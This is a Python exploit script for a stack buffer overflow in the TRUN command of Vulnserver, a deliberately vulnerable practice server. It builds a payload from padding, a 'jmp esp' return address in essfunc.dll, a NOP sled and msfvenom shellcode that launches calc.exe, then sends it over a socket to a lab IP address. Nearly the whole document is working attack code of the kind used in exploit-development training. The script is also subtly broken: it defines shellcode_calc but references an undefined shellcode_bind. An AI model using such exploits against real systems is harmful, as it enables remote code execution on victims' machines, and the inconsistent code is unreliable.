# Exploit for Vulnserver - TRUN - Stack buffer Overflow (ESP)
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
import socket
import sys

# msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0a\x0d" -f python -v shellcode_calc

shellcode_calc =  b""
shellcode_calc += b"\xb8\x47\x2d\x8b\x9b\xd9\xf7\xd9\x74\x24"
shellcode_calc += b"\xf4\x5d\x31\xc9\xb1\x31\x31\x45\x13\x03"
shellcode_calc += b"\x45\x13\x83\xed\xbb\xcf\x7e\x67\xab\x92"
shellcode_calc += b"\x81\x98\x2b\xf3\x08\x7d\x1a\x33\x6e\xf5"
shellcode_calc += b"\x0c\x83\xe4\x5b\xa0\x68\xa8\x4f\x33\x1c"
shellcode_calc += b"\x65\x7f\xf4\xab\x53\x4e\x05\x87\xa0\xd1"
shellcode_calc += b"\x85\xda\xf4\x31\xb4\x14\x09\x33\xf1\x49"
shellcode_calc += b"\xe0\x61\xaa\x06\x57\x96\xdf\x53\x64\x1d"
shellcode_calc += b"\x93\x72\xec\xc2\x63\x74\xdd\x54\xf8\x2f"
shellcode_calc += b"\xfd\x57\x2d\x44\xb4\x4f\x32\x61\x0e\xfb"
shellcode_calc += b"\x80\x1d\x91\x2d\xd9\xde\x3e\x10\xd6\x2c"
shellcode_calc += b"\x3e\x54\xd0\xce\x35\xac\x23\x72\x4e\x6b"
shellcode_calc += b"\x5e\xa8\xdb\x68\xf8\x3b\x7b\x55\xf9\xe8"
shellcode_calc += b"\x1a\x1e\xf5\x45\x68\x78\x19\x5b\xbd\xf2"
shellcode_calc += b"\x25\xd0\x40\xd5\xac\xa2\x66\xf1\xf5\x71"
shellcode_calc += b"\x06\xa0\x53\xd7\x37\xb2\x3c\x88\x9d\xb8"
shellcode_calc += b"\xd0\xdd\xaf\xe2\xbe\x20\x3d\x99\x8c\x23"
shellcode_calc += b"\x3d\xa2\xa0\x4b\x0c\x29\x2f\x0b\x91\xf8"
shellcode_calc += b"\x14\xe3\xdb\xa1\x3c\x6c\x82\x33\x7d\xf1"
shellcode_calc += b"\x35\xee\x41\x0c\xb6\x1b\x39\xeb\xa6\x69"
shellcode_calc += b"\x3c\xb7\x60\x81\x4c\xa8\x04\xa5\xe3\xc9"
shellcode_calc += b"\x0c\xc6\x62\x5a\xcc\x27\x01\xda\x77\x38"

junk  = "TRUN /.:/"
junk += "A" * 2003
jump  = "\xaf\x11\x50\x62"   # 0x625011af : jmp esp in essfunc.dll
nops  = "\x90" * 20
junk2 = "C" * (5000-2003-4-len(shellcode_bind+nops+jump))

buffer = junk + jump + nops + shellcode_bind + junk2 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.35.132", 9999))
print s.recv(1024)
s.send(buffer)
s.close()
